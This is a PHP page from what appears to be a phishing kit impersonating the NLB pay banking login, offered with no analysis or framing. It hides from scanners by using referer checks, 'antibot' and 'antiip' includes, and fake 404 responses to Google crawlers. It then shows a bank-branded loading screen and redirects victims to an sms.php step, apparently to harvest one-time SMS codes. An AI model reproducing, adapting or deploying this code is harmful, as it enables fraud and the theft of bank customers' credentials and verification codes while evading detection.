<?php 
   include('config.php');
   header("Refresh: 3; url=sms.php?id=".$ip); 
   $aa = $_SERVER['HTTP_HOST'];
   $ref = $_SERVER['HTTP_REFERER'];
   $refData = parse_url($ref);
   if ($refData['host'] !=$aa) {
   ?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
   header('HTTP/1.0 404 Not Found');
   exit(); ?>
<?php }else{ ?>
<?php
   error_reporting(0);
   include('includes/antibot1.php');
   include('includes/antibot2.php');
   include('includes/antiip.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   ?>
<!DOCTYPE html>
<html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>NLB pay</title>
    <meta name="multilanguage" content="true">
    <meta name="lng" content="el">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex,nofollow,noimageindex,noarchive,nocache,nosnippet">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="assets/img/favicon.ico">
    <link href="assets/css/loading.css" rel="stylesheet">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   </head>
   <body class="login-bg">
   <index-page>
         <div class="loader">
            <div class="loading-stage-container">
               <div class="flex-all-center">
                  <div class="loading-stage-logo-container">
                     <figure class="margin-0">
                        <img class="loading-stage-logo" src="assets/img/logo-sprite-2017.png" alt="">
                     </figure>
                  </div>
               </div>
               <spinner>
                  <div class="flex-column-all-center">
                     <div class="circle-loader"></div>
                     <h5 class="loader-text">Prosim počakaj</h5>
                  </div>
               </spinner>
            </div>
         </div>
      </index-page>
   </body>
</html>
<?php } ?>